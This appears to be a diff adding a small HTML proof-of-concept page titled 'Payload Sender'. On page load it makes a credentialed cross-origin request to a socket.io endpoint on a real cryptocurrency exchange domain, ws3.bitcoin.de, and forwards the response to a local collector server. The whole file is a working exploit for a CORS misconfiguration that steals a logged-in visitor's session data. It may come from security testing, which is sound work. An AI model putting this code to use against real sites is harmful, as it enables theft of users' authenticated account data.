@@ -1,0 +1,51 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>z-admin</title>
+</head>
+<body onload="sendCORSRequest()">
+  
+  <!-- Center the content on the page -->
+  <center>
+    <h2>Payload Sender</h2>
+    <p>hello world</p>
+  </center>
+
+  <script>
+    // Asynchronous function to send CORS requests
+    async function sendCORSRequest() {
+      try {
+        // Perform a GET request to retrieve data from the specified URL
+        const response = await fetch("https://ws3.bitcoin.de/socket.io/1/?EIO=3&transport=polling&t=M-Q4oX6", {
+          method: "GET",
+          credentials: "include",  // Include cookies in cross-origin requests
+        });
+
+        if (response.ok) {
+          // If the GET request is successful, parse the response text
+          const responseData = await response.text();
+          console.log("Received Data:", responseData);
+
+          // Send the received data to the specified server using a POST request
+          const sendRequest = await fetch("http://127.0.0.1:8081", {
+            method: "POST",
+            headers: { "Content-Type": "application/json" },
+            body: JSON.stringify({ data: responseData }),
+          });
+
+          if (sendRequest.ok) {
+            console.log("Data successfully sent to the server.");
+          } else {
+            console.error("Failed to send data to the server.");
+          }
+        }
+      } catch (error) {
+        // Log any errors that occur during the CORS request
+        console.error("Error during the CORS request:", error);
+      }
+    }
+  </script>
+</body>
+</html>
